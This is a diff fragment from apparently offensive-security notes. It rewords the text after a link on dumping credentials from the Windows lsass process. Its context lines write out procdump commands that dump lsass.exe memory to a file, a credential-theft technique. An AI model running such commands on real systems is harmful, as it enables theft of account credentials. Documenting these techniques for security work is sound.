@@ -11,7 +11,7 @@ procdump.exe -accepteula -ma lsass.exe lsass.dmp
 procdump.exe -accepteula -r -ma lsass.exe lsass.dmp
 ```
 
-check https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz for GUI dump
+check https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz for more techniques
 
 ### Dumping Hashes
 
